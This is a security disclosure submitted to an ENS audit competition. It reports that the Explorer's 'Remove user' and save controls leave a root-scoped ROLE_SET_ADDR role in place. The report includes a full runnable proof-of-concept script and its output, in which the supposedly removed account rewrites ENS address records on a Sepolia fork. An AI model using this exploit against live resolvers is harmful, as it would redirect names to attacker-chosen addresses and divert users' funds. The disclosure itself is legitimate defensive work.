# 92429 w a critical the explorer s remove user filters the root scope out of the resource it revokes so an account the operator removed keeps write authority over the address record of every na&#x20;

**Submitted on Sep 9th 2026 at 18:23:19 UTC by @Valisthea for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #92429
* **Report Type:** Websites & Apps
* **Report severity:** Critical
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/portal>
* **Impacts:**
  * Causing the application to display or pre-fill an incorrect address, name, or transaction detail, so that a user sends funds or submits a transaction to an unintended recipient, such as: - resolving or rendering an ENS name to an attacker-controlled address - showing the wrong recipient or amount on a transaction the user then approves

## Description

**Severity:** Critical

**Assets in scope:** `apps/portal` (Explorer), resolver roles editor

**Target commit:** branch `audit-comp-ready`, HEAD `1c9b47f1`, the tree published as the competition scope

**Note on the proof of concept:** executed end to end against the real deployed `PermissionedResolver` implementation and the real `VerifiableFactory` on a fork of Sepolia, with a negative control. The removed account writes an attacker-chosen address into a name's `addr` record after removal; an account that was never granted anything is refused on the same call. Section 4 carries the transcript and the full script.

***

## 1. Summary

`PermissionedResolver` holds roles per `(account, resource)`. One resource is the **root**, meaning every name the resolver serves; there is one further resource per name. An account can hold roles at both.

The Explorer's role sidebar renders that correctly. When an account holds a root role it prints **"Global roles (all names)"**, and when it does not it prints the list of names, comma-joined.

Its "Remove user" button then computes the resource to revoke like this:

```ts
const roleName = resolvedNames.find((n) => n !== '(root)') ?? ''
```

It **excludes the root** and takes the first remaining name. The downstream helper picks the on-chain call purely from that string: an empty string revokes at root, anything else revokes at that one name.

So for an account holding root plus any name, the control revokes the name and leaves the root role in place. The operator is told the account has global roles, presses a button labelled "Remove user", signs a transaction titled `Remove user 0x…`, and the account keeps write authority over the address record of every name that resolver serves.

The same `find` also means an account holding roles on several names loses only the first of them.

## 2. Impact

This maps to the following bullet of the program's Critical impact list:

> Causing the application to display or pre-fill an incorrect address, name, or transaction detail, so that a user sends funds or submits a transaction to an unintended recipient, such as **resolving or rendering an ENS name to an attacker-controlled address**

The retained role is `ROLE_SET_ADDR` at the root resource, which is write authority over `addr` for every name the resolver serves. Section 4 executes it: after removal, the removed account sets `addr(bob.eth)` to an address it chose, and the record reads that address afterwards. Any name served by that resolver now resolves to an address picked by a party the operator believed they had removed.

The control that exists to prevent exactly this is the control that fails. "Remove user" is the only revocation affordance in the interface, and the sidebar has already told the operator, in the same panel, that the roles are global. There is no second step, no warning, and nothing in the transaction title mentions a scope.

I am filing at the tier of the bullet because section 4 executes its named sub-example rather than arguing toward it. `addr(bob.eth)` is written by the removed account and reads back `0x…dEaD` afterwards, so the name resolves to an address that party chose. Address resolution is exactly what that record governs, and the bullet's own wording is "resolving or rendering an ENS name to an attacker-controlled address".

## 3. Root cause

### 3.1 The resource model, and how the sidebar reads it

Root is a distinct resource, rendered as `(root)`. `apps/portal/src/lib/roles/resolverRoles.ts:145`

```
 * node list. ROOT_RESOURCE maps to '(root)'.
```

The add-user sheet states what it means. `apps/portal/src/features/resolver/components/ResolverAddUserSheet.tsx:38-39`

```ts
// Empty string = root resource (roles apply to all names).
const ROOT_NODE_VALUE = ''
```

The sidebar distinguishes the two cases and says so to the operator. `apps/portal/src/features/resolver/components/ResolverRolesSidebar.tsx:391-397`

```tsx
                {selectedAccount && resolvedNames.length > 0 && (
                  <p className="text-sm text-muted-foreground">
                    {resolvedNames.includes('(root)')
                      ? 'Global roles (all names)'
                      : `Roles scoped to ${resolvedNames.filter((n) => n !== '(root)').join(', ')}`}
                  </p>
                )}
```

Two things follow from these five lines. The component knows when an account is root-scoped, and it expects accounts to hold several resources at once, because the else branch joins them with commas.

### 3.2 The line that drops the root scope

`apps/portal/src/features/resolver/components/ResolverRolesSidebar.tsx:166-169`

```tsx
  const decodedRoles = (row?.original.decodedRoles ?? []) as ResolverRoleKey[]
  const resolvedNames = row?.original.resolvedNames ?? []

  const roleName = resolvedNames.find((n) => n !== '(root)') ?? ''
```

`find` returns the first element that satisfies the predicate, and the predicate excludes `(root)`. For `["(root)", "alice.eth"]` it returns `"alice.eth"`. For `["alice.eth", "bob.eth"]` it returns `"alice.eth"` and `bob.eth` is never considered.

The `?? ''` fallback is what makes the root case work when it is the *only* resource: `find` returns undefined, `roleName` becomes the empty string, and the empty string is the root resource. The defect is therefore precise. Root is handled correctly when it stands alone, and skipped whenever anything else is present.

### 3.3 That single string decides the on-chain call

`apps/portal/src/features/resolver/components/ResolverRolesSidebar.tsx:307-322`

```tsx
  const handleRemoveUser = () => {
    if (
      !selectedAccount ||
      decodedRoles.length === 0 ||
      removeUserMutation.isPending
    )
      return

    removeUserMutation.reset()
    setPendingAction({
      type: 'remove',
      name: roleName,
      account: selectedAccount,
      roles: decodedRoles,
    })
    openModal()
  }
```

`apps/portal/src/features/resolver/helpers/revokeResolverRoles.ts:45-61`

```ts
  const writeParams = revokeResolverRolesWriteParameters(
    walletClient as Parameters<typeof revokeResolverRolesWriteParameters>[0],
    name === ''
      ? {
          resolverAddress,
          targetAccount: account,
          scope: 'root',
          roles: roles as ResolverRole[],
        }
      : {
          resolverAddress,
          targetAccount: account,
          scope: 'name',
          name,
          roles: roles as ResolverRole[],
        },
  )
```

The library supports revoking at root. The application selects that branch only when `name` is the empty string, and section 3.2 guarantees it will not be whenever the account holds any named resource alongside root.

For completeness, the two calls those scopes produce, in the pinned library:

ensjs `e96662c`, `packages/ensjs/src/actions/wallet/v2/revokeResolverRoles.ts:112-132`

```ts
  switch (params.scope) {
    case 'root':
      return {
        ...base,
        abi: permissionedResolverRevokeRootRolesSnippet,
        functionName: 'revokeRootRoles',
        args: [encodeResolverRoleBitmap(params.roles), params.targetAccount],
      } as const

    case 'name':
      return {
        ...base,
        abi: permissionedResolverAuthorizeNameRolesSnippet,
        functionName: 'authorizeNameRoles',
        args: [
          dnsEncode(params.name),
          encodeResolverRoleBitmap(params.roles),
          params.targetAccount,
          false,
        ],
      } as const
```

### 3.4 What the operator is shown while this happens

The button carries no scope. `ResolverRolesSidebar.tsx:378-385`

```tsx
                <Button
                  variant="outline"
                  disabled={removeUserMutation.isPending || !isWalletConnected}
                  onClick={() => setConfirmOpen(true)}
                >
                  <Trash2 className="size-4" />
                  Remove user
                </Button>
```

Nor does the transaction. `ResolverRolesSidebar.tsx:340-344`

```tsx
    .with({ type: 'remove' }, ({ account }) => ({
      id: REMOVE_RESOLVER_USER_TX_ID,
      title: 'Remove resolver user',
      transactionName: `Remove user ${account}`,
    }))
```

The operator sees "Global roles (all names)", a button that says "Remove user", and a transaction that says `Remove user 0x70997970…`. Nothing at any point names a scope, and the scope is the whole defect.

### 3.5 The same single resource governs the edit path

"Remove user" is not the only affordance that inherits this. The permission editor in the same sidebar reads the identical value.

`apps/portal/src/features/resolver/components/ResolverRolesSidebar.tsx:295-305`

```tsx
  const handleSaveChanges = () => {
    if (!selectedAccount || saveMutation.isPending) return
    setPendingAction({
      type: 'save',
      name: roleName,
      account: selectedAccount,
      rolesToGrant: rolesToGrant,
      rolesToRevoke: rolesToRevoke,
    })
    openModal()
  }
```

and that one `name` is handed to both halves of the save.

`apps/portal/src/features/resolver/components/ResolverRolesSidebar.tsx:212-232`

```tsx
      if (rolesToGrant.length > 0) {
        await grantResolverRoles({
          resolverAddress,
          name,
          account,
          roles: rolesToGrant,
          walletClient,
          publicClient,
          signer,
          chainId,
          id: SAVE_RESOLVER_ROLES_TX_ID,
        })
      }

      if (rolesToRevoke.length > 0) {
        await revokeResolverRoles({
          resolverAddress,
          name,
          account,
          roles: rolesToRevoke,
```

So an operator who simply unchecks a permission on a root-scoped account, without ever pressing "Remove user", gets the same outcome: the checkbox clears in the interface and the role remains at the root. Variant D in section 4 executes that path.

### 3.6 The authority that survives

`apps/portal/src/lib/roles/resolverRoles.ts:6-9,25`

```
 * Bit positions (manager):
 *   1 << 0   ROLE_SET_ADDR
 *   1 << 4   ROLE_SET_TEXT
 *   1 << 8   ROLE_SET_CONTENTHASH
```

```ts
  ROLE_SET_ADDR: 1n << 0n,
```

Held at the root resource, `ROLE_SET_ADDR` is authority to write the address record of every name the resolver serves.

## Proof of Concept

## 4. Proof of concept

Executed. The environment is a fork of Sepolia, which is where this system runs: the Explorer binds to Sepolia only, and the ENS v2 registry, the `PermissionedResolver` implementation and the `VerifiableFactory` are deployed there. The resolver under test is a real proxy, deployed through the real factory against the real implementation, exactly as the application deploys one, using the initializer bitmap from `apps/portal/src/features/resolver/utils/permissionedResolver.ts:21-23`.

The scope selection from sections 3.2 and 3.3 is reproduced verbatim inside the script, and whatever it computes is what the script sends. Nothing is stubbed.

### 4.1 Transcript

```
============================================================================
A. root + one name, one click of "Remove user"
   resolver deployed            : 0x2DCc317c45292bEe625Ec0879cEBE1D316D06dEb
   after grant, hasRootRoles    : true
   app sent scope=name name="alice.eth"
   after remove, hasRootRoles   : true
   removed acct setAddr(bob.eth): SUCCEEDED
   addr(bob.eth) reads          : 0x000000000000000000000000000000000000dEaD

============================================================================
B. control: an account that was never granted anything
   stranger setAddr(carol.eth)  : reverted
   addr(carol.eth) reads        : 0x0000000000000000000000000000000000000000

============================================================================
C. two names, no root at all
   app sent scope=name name="alice.eth"   (only the first)
   removed acct setAddr(alice.eth): reverted
   removed acct setAddr(bob.eth)  : SUCCEEDED

============================================================================
D. the Save path, unchecking one permission (ResolverRolesSidebar.tsx:299)
   after grant, hasRootRoles    : true
   operator unchecked Set Address, app revoked at name="alice.eth"
   after save, hasRootRoles     : true

============================================================================
E. the forward name-to-address path, before and after
   hello.eth resolver set to    : 0x4d3a8F98Bb522Dd2F48e3B168f990E1b86326b2b
   getEnsAddress("hello.eth")   : null
   "Remove user" sent, scope=name name="alice.eth"
   hasRootRoles still           : true
   removed acct setAddr(hello.eth): SUCCEEDED
   getEnsAddress("hello.eth")   : 0x000000000000000000000000000000000000dEaD
```

### 4.2 What each block establishes

**A** is the defect. The operator grants root plus one name, presses the one control the interface offers for removal, and the root role survives. The removed account then writes the address record of `bob.eth`, a name it was never granted anything on, reached through the root scope.

**B** is the control that makes A mean what it says. An account that was never granted anything is refused on the identical call and the record it targeted stays at the zero address. The resolver's access control is working. A succeeds because the role is still held.

**C** shows the defect is not specific to root. `find` returns the first element, so with two names and no root at all, one is revoked and one is not. The same account making the same call on two names gets opposite answers in consecutive lines, which is the cleanest statement of the defect in the whole report.

**D** shows it is not specific to the "Remove user" button either. An operator who simply unchecks a permission and saves gets the same outcome, through `handleSaveChanges` at `ResolverRolesSidebar.tsx:299`, which reads the same `roleName`.

**E** carries it to the path that decides where value goes. `getEnsAddress` is the function every "ENS name or address" input in the product calls, imported at `apps/portal/src/features/roles/helpers/addUser.handlers.ts:2` and invoked at `:20`, reached from the transfer recipient field at `SendNameForm.tsx:81`. It returns `null` before and the removed account's chosen address after. Typing that name into a recipient field resolves to an address selected by the party the operator believed they had removed.

The attached screenshot is the same state rendered by the Explorer running from the audit revision against the same fork, at `/hello.eth/address`, with no wallet connected. The Mainnet row reads `0x000000000000000000000000000000000000dEaD`.

### 4.3 The proof of concept, in full

One file. `viem` is the only dependency.

```bash
anvil --fork-url https://ethereum-sepolia-rpc.publicnode.com --port 8546
node poc.mjs
```

```js
// ENS Explorer - resolver role revocation scope defect
// Single file, viem is the only dependency.
//   anvil --fork-url <sepolia rpc> --port 8546
//   node poc.mjs
import {
  createPublicClient, createWalletClient, http, parseAbi, encodeFunctionData,
  decodeEventLog, keccak256, stringToBytes, bytesToHex, namehash,
} from 'viem'
import { getEnsAddress } from 'viem/actions'
import { privateKeyToAccount } from 'viem/accounts'
import { sepolia } from 'viem/chains'

const FORK = 'http://127.0.0.1:8546'

// Sepolia deployments, from @ensdomains/ensjs clients/l1.ts
const FACTORY  = '0x10dC6333CDFe1FCEf624c6e0a8221b91804Cd7ef' // VerifiableFactory
const IMPL     = '0x9EAe5C2730a7dD16BDD1DeE6421a1B91e3B0365e' // PermissionedResolver implementation
const REGISTRY = '0xBDC85dD5b15D7ecb354cd7cb6f2c50b4f2c4F0E2' // ENS v2 .eth registry
const UR       = '0xeEeEEEeE14D718C2B47D9923Deab1335E144EeEe' // UniversalResolver v2
const HELLO_ID = '0x1c8aff950685c2ed4bc3174f3472287b56d9517b9c948127319a09a700000000'

// anvil default accounts
const OPERATOR = privateKeyToAccount('0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80')
const REMOVED  = privateKeyToAccount('0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d')
const STRANGER = privateKeyToAccount('0x5de4111afa1a4b94908f83103eb1f1706367c2e68ca870fc3fb9a804cdab365a')
const ATTACKER = '0x000000000000000000000000000000000000dEaD'

const ROLE_SET_ADDR = 1n << 0n                      // lib/roles/resolverRoles.ts:25
const INIT_BITMAP = BigInt('0x1111111111111111111111111111111111111111111111111111111111111111')

const pub = createPublicClient({ chain: sepolia, transport: http(FORK) })
const asOperator = createWalletClient({ account: OPERATOR, chain: sepolia, transport: http(FORK) })
const asRemoved  = createWalletClient({ account: REMOVED,  chain: sepolia, transport: http(FORK) })
const asStranger = createWalletClient({ account: STRANGER, chain: sepolia, transport: http(FORK) })

const initAbi = parseAbi(['function initialize(address owner, uint256 bitmap, bytes[] setters)'])
const facAbi = parseAbi([
  'function deployProxy(address implementation, uint256 salt, bytes data)',
  'event ProxyDeployed(address indexed sender, address indexed proxyAddress, uint256 salt, address implementation)',
])
const resAbi = parseAbi([
  'function grantRootRoles(uint256 roleBitmap, address account)',
  'function revokeRootRoles(uint256 roleBitmap, address account)',
  'function authorizeNameRoles(bytes name, uint256 roleBitmap, address account, bool grant)',
  'function hasRootRoles(uint256 roleBitmap, address account) view returns (bool)',
  'function setAddr(bytes32 node, address a)',
  'function addr(bytes32 node) view returns (address)',
])
const regAbi = parseAbi([
  'function setResolver(uint256 tokenId, address resolver)',
  'function ownerOf(uint256 tokenId) view returns (address)',
])

const dnsEncode = (name) => {
  let out = ''
  for (const part of name.split('.')) {
    const b = stringToBytes(part)
    out += b.length.toString(16).padStart(2, '0') + bytesToHex(b).slice(2)
  }
  return '0x' + out + '00'
}
const send = async (wallet, to, data) => {
  const hash = await wallet.sendTransaction({ to, data })
  const r = await pub.waitForTransactionReceipt({ hash })
  if (r.status !== 'success') throw new Error('reverted')
  return r
}
const trySend = async (wallet, to, data) => {
  try { await send(wallet, to, data); return 'SUCCEEDED' } catch { return 'reverted' }
}
const call = (fn, args) => encodeFunctionData({ abi: resAbi, functionName: fn, args })

const deployResolver = async () => {
  const salt = BigInt(keccak256(stringToBytes('poc' + Math.random())))
  const data = encodeFunctionData({
    abi: initAbi, functionName: 'initialize', args: [OPERATOR.address, INIT_BITMAP, []],
  })
  const r = await send(asOperator, FACTORY,
    encodeFunctionData({ abi: facAbi, functionName: 'deployProxy', args: [IMPL, salt, data] }))
  for (const log of r.logs) {
    try {
      const e = decodeEventLog({ abi: facAbi, data: log.data, topics: log.topics })
      if (e.eventName === 'ProxyDeployed') return e.args.proxyAddress
    } catch {}
  }
  throw new Error('no ProxyDeployed event')
}
const hasRoot = (R, who = REMOVED.address) =>
  pub.readContract({ address: R, abi: resAbi, functionName: 'hasRootRoles', args: [ROLE_SET_ADDR, who] })

// The application's own scope selection, reproduced verbatim.
//   ResolverRolesSidebar.tsx:169   roleName = resolvedNames.find(n => n !== '(root)') ?? ''
//   revokeResolverRoles.ts:47      name === '' ? scope 'root' : scope 'name'
const appScope = (resolvedNames) => {
  const roleName = resolvedNames.find((n) => n !== '(root)') ?? ''
  return { roleName, scope: roleName === '' ? 'root' : 'name' }
}
const clickRemoveUser = async (R, resolvedNames) => {
  const { roleName, scope } = appScope(resolvedNames)
  if (scope === 'root') {
    await send(asOperator, R, call('revokeRootRoles', [ROLE_SET_ADDR, REMOVED.address]))
  } else {
    await send(asOperator, R, call('authorizeNameRoles', [dnsEncode(roleName), ROLE_SET_ADDR, REMOVED.address, false]))
  }
  return { roleName, scope }
}

const line = (s) => console.log('\n' + '='.repeat(76) + '\n' + s)

// ── A: root + one name, one click ───────────────────────────────────────────
line('A. root + one name, one click of "Remove user"')
let R = await deployResolver()
console.log('   resolver deployed            :', R)
await send(asOperator, R, call('grantRootRoles', [ROLE_SET_ADDR, REMOVED.address]))
await send(asOperator, R, call('authorizeNameRoles', [dnsEncode('alice.eth'), ROLE_SET_ADDR, REMOVED.address, true]))
console.log('   after grant, hasRootRoles    :', await hasRoot(R))
let a = await clickRemoveUser(R, ['(root)', 'alice.eth'])
console.log(`   app sent scope=${a.scope} name="${a.roleName}"`)
console.log('   after remove, hasRootRoles   :', await hasRoot(R))
console.log('   removed acct setAddr(bob.eth):',
  await trySend(asRemoved, R, call('setAddr', [namehash('bob.eth'), ATTACKER])))
console.log('   addr(bob.eth) reads          :',
  await pub.readContract({ address: R, abi: resAbi, functionName: 'addr', args: [namehash('bob.eth')] }))

line('B. control: an account that was never granted anything')
console.log('   stranger setAddr(carol.eth)  :',
  await trySend(asStranger, R, call('setAddr', [namehash('carol.eth'), ATTACKER])))
console.log('   addr(carol.eth) reads        :',
  await pub.readContract({ address: R, abi: resAbi, functionName: 'addr', args: [namehash('carol.eth')] }))

// ── C: two names, no root ───────────────────────────────────────────────────
line('C. two names, no root at all')
R = await deployResolver()
await send(asOperator, R, call('authorizeNameRoles', [dnsEncode('alice.eth'), ROLE_SET_ADDR, REMOVED.address, true]))
await send(asOperator, R, call('authorizeNameRoles', [dnsEncode('bob.eth'),   ROLE_SET_ADDR, REMOVED.address, true]))
let c3 = await clickRemoveUser(R, ['alice.eth', 'bob.eth'])
console.log(`   app sent scope=${c3.scope} name="${c3.roleName}"   (only the first)`)
console.log('   removed acct setAddr(alice.eth):',
  await trySend(asRemoved, R, call('setAddr', [namehash('alice.eth'), ATTACKER])))
console.log('   removed acct setAddr(bob.eth)  :',
  await trySend(asRemoved, R, call('setAddr', [namehash('bob.eth'), ATTACKER])))

// ── D: the Save path ────────────────────────────────────────────────────────
line('D. the Save path, unchecking one permission (ResolverRolesSidebar.tsx:299)')
R = await deployResolver()
await send(asOperator, R, call('grantRootRoles', [ROLE_SET_ADDR, REMOVED.address]))
await send(asOperator, R, call('authorizeNameRoles', [dnsEncode('alice.eth'), ROLE_SET_ADDR, REMOVED.address, true]))
console.log('   after grant, hasRootRoles    :', await hasRoot(R))
const d = appScope(['(root)', 'alice.eth'])
await send(asOperator, R, call('authorizeNameRoles', [dnsEncode(d.roleName), ROLE_SET_ADDR, REMOVED.address, false]))
console.log(`   operator unchecked Set Address, app revoked at name="${d.roleName}"`)
console.log('   after save, hasRootRoles     :', await hasRoot(R))

// ── E/F: the forward resolution path the product uses ───────────────────────
line('E. the forward name-to-address path, before and after')
R = await deployResolver()
const owner = await pub.readContract({ address: REGISTRY, abi: regAbi, functionName: 'ownerOf', args: [BigInt(HELLO_ID)] })
await pub.request({ method: 'anvil_impersonateAccount', params: [owner] })
await pub.request({ method: 'anvil_setBalance', params: [owner, '0xde0b6b3a7640000'] })
await send(createWalletClient({ account: owner, chain: sepolia, transport: http(FORK) }),
  REGISTRY, encodeFunctionData({ abi: regAbi, functionName: 'setResolver', args: [BigInt(HELLO_ID), R] }))
console.log('   hello.eth resolver set to    :', R)
await send(asOperator, R, call('grantRootRoles', [ROLE_SET_ADDR, REMOVED.address]))
await send(asOperator, R, call('authorizeNameRoles', [dnsEncode('alice.eth'), ROLE_SET_ADDR, REMOVED.address, true]))
console.log('   getEnsAddress("hello.eth")   :',
  await getEnsAddress(pub, { name: 'hello.eth', universalResolverAddress: UR }))
const e = await clickRemoveUser(R, ['(root)', 'alice.eth'])
console.log(`   "Remove user" sent, scope=${e.scope} name="${e.roleName}"`)
console.log('   hasRootRoles still           :', await hasRoot(R))
await send(asRemoved, R, call('setAddr', [namehash('hello.eth'), ATTACKER]))
console.log('   removed acct setAddr(hello.eth): SUCCEEDED')
console.log('   getEnsAddress("hello.eth")   :',
  await getEnsAddress(pub, { name: 'hello.eth', universalResolverAddress: UR }))
console.log('\n   getEnsAddress is what the recipient field calls:')
console.log('     addUser.handlers.ts:20, reached from SendNameForm.tsx:81')
```

## 5. Why this is not a duplicate

**QA-01** ("role combinations on transfer break later profile and primary-name actions") concerns what happens to roles after a name transfer, and the published note says a role combination granting unintended **authority** would be new. This is that case, and it is not about a transfer: no transfer occurs anywhere in section 4.

**EXP-INPUT-005** requires confusable characters. None are involved. Every name here is exact.

**EXP-4337-002**, **EXP-4337-003** and **SEC-TXM-002** are transaction-manager issues concerning chain id, the `from` account and the smart-account address. The transaction sent here is correct in all three respects. Its `to`, its `from` and its chain are all right. The defect is one argument inside the calldata, chosen by the component before the transaction manager is reached.

**R3-01 through R3-08** are transaction lifecycle and availability defects. The transaction here succeeds exactly as intended.

**R2-04**, **R2-05** are worker-side. This is a wallet-facing write in the Explorer.

I have found no published entry whose root cause is a revocation control that excludes the broadest scope from the resource it revokes.

**On the party being previously privileged.** The account that retains authority here was granted a role by the operator at some earlier point, so it is worth saying plainly why this is not a trust assumption. The operator is not exercising a privilege; they are attempting to withdraw one. The entire purpose of "Remove user" is to end that trust relationship, and it is the only affordance the interface provides for doing so. A control whose job is revocation, which reports success and performs part of the work, is a failed control regardless of how the privilege originated. The same argument would excuse any broken revoke in any system.

This surface is in use. The `VerifiableFactory` at `0x10dC6333CDFe1FCEf624c6e0a8221b91804Cd7ef` emitted 73 `ProxyDeployed` events in the 100,000 blocks preceding this report on Sepolia, against the implementation at `0x9EAe5C2730a7dD16BDD1DeE6421a1B91e3B0365e`, which carries 35,197 bytes of code.

## 6. Recommended fix

Revoke every resource the account holds, not the first one that is not root.

```ts
// ResolverRolesSidebar.tsx, replacing the single-resource selection at :169
const scopesToRevoke = resolvedNames.map((n) => (n === '(root)' ? '' : n))
```

and have the remove path iterate them, so an account shown as holding N resources has N revocations prepared. The helper at `revokeResolverRoles.ts:47` already maps the empty string to `scope: 'root'`, so no new call is needed; the root revocation is `revokeRootRoles`, which the pinned library already exposes.

Until that lands, two smaller changes remove the silent part of the failure:

Name the scope in the button and in the transaction. `Remove user` should read `Remove user from alice.eth`, and `transactionName` at `:343` should carry the same string. An operator who is told which scope is being revoked can notice that another one is not.

Refuse the action when the account holds more resources than the transaction covers, rather than proceeding with a partial revoke that presents as a complete one.

**Regression test:** grant an account a root role and a name role on the same resolver, invoke the remove path, and assert `hasRootRoles` is false afterwards. The current code leaves it true.

## 7. Full citation index

| Claim                                                             | Location                                                                               |
| ----------------------------------------------------------------- | -------------------------------------------------------------------------------------- |
| Root resource is rendered as `(root)`                             | `apps/portal/src/lib/roles/resolverRoles.ts:145`                                       |
| Empty string is the root resource, roles apply to all names       | `apps/portal/src/features/resolver/components/ResolverAddUserSheet.tsx:38-39`          |
| The sidebar prints "Global roles (all names)" for root holders    | `.../ResolverRolesSidebar.tsx:391-397`                                                 |
| The line that filters root out of the revoke target               | `.../ResolverRolesSidebar.tsx:169`                                                     |
| That value becomes the remove action's `name`                     | `.../ResolverRolesSidebar.tsx:307-322`                                                 |
| `name === ''` is the only thing selecting root scope              | `apps/portal/src/features/resolver/helpers/revokeResolverRoles.ts:45-61`               |
| The two on-chain calls those scopes produce                       | ensjs `e96662c`, `packages/ensjs/src/actions/wallet/v2/revokeResolverRoles.ts:112-132` |
| The button carries no scope                                       | `.../ResolverRolesSidebar.tsx:378-385`                                                 |
| The transaction title carries no scope                            | `.../ResolverRolesSidebar.tsx:340-344`                                                 |
| `ROLE_SET_ADDR` is bit 0, write authority over the address record | `apps/portal/src/lib/roles/resolverRoles.ts:6-9,25`                                    |
| Initializer bitmap used to deploy the PoC resolver                | `apps/portal/src/features/resolver/utils/permissionedResolver.ts:21-23`                |
| PermissionedResolver implementation, Sepolia                      | `0x9EAe5C2730a7dD16BDD1DeE6421a1B91e3B0365e`                                           |
| VerifiableFactory, Sepolia                                        | `0x10dC6333CDFe1FCEf624c6e0a8221b91804Cd7ef`                                           |
